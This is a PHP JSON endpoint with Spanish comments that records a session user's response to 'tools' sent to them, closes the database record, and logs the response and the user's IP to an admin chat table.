<?php
// Suprimir warnings para evitar interferir con JSON
error_reporting(E_ERROR | E_PARSE);
session_start();
header('Content-Type: application/json');

// Verificar si hay un usuario en sesión
if (!isset($_SESSION['usuario_id'])) {
    echo json_encode(['success' => false, 'error' => 'No hay sesión de usuario']);
    exit;
}

try {
    require_once '../php_config/conexionbd.php';
    $pdo = conectarBD();
    
    $input = json_decode(file_get_contents('php://input'), true);
    
    if (!$input || !isset($input['accion'])) {
        echo json_encode(['success' => false, 'error' => 'Datos no válidos']);
        exit;
    }
    
    if ($input['accion'] === 'aceptar_herramientas' || $input['accion'] === 'respuesta_herramientas') {
        // Obtener la herramienta más reciente del usuario
        $stmt = $pdo->prepare("
            SELECT id FROM herramientas_enviadas 
            WHERE usuario_id = ? 
            AND estado = 'visto'
            AND session_id = ?
            ORDER BY fecha_envio DESC 
            LIMIT 1
        ");
        
        $stmt->execute([$_SESSION['usuario_id'], session_id()]);
        $herramienta = $stmt->fetch(PDO::FETCH_ASSOC);
        
        if ($herramienta) {
            // Marcar como cerrada
            $updateStmt = $pdo->prepare("
                UPDATE herramientas_enviadas 
                SET estado = 'cerrado', 
                    fecha_cerrado = CURRENT_TIMESTAMP 
                WHERE id = ?
            ");
            
            $updateStmt->execute([$herramienta['id']]);
            
            // Determinar el mensaje según el tipo de respuesta
            $tipo_respuesta = $input['tipo_respuesta'] ?? 'aceptar';
            $mensaje_chat = '';
            
            switch ($tipo_respuesta) {
                case 'descarga':
                    $mensaje_chat = 'bXBot: Descargando';
                    break;
                case 'cerrar':
                    $mensaje_chat = 'bXBot: Cerró herramientas';
                    break;
                default:
                    $mensaje_chat = 'bXBot: Aceptó herramientas';
                    break;
            }
            
            // Enviar mensaje al chat del admin
            $adminStmt = $pdo->prepare("
                INSERT INTO mensajes_admin 
                (usuario_id, admin_id, mensaje, tipo_mensaje, ip_usuario, estado) 
                VALUES (?, 1, ?, 'sin_input', ?, 'leido')
            ");
            
            $adminStmt->execute([
                $_SESSION['usuario_id'],
                $mensaje_chat,
                $_SERVER['REMOTE_ADDR']
            ]);
            
            echo json_encode([
                'success' => true,
                'message' => 'Herramientas aceptadas correctamente'
            ]);
        } else {
            echo json_encode([
                'success' => false,
                'error' => 'No se encontró herramienta pendiente'
            ]);
        }
    } else {
        echo json_encode([
            'success' => false,
            'error' => 'Acción no válida'
        ]);
    }
    
} catch (PDOException $e) {
    echo json_encode([
        'success' => false,
        'error' => 'Error de base de datos: ' . $e->getMessage()
    ]);
} catch (Exception $e) {
    echo json_encode([
        'success' => false,
        'error' => 'Error: ' . $e->getMessage()
    ]);
}
?> 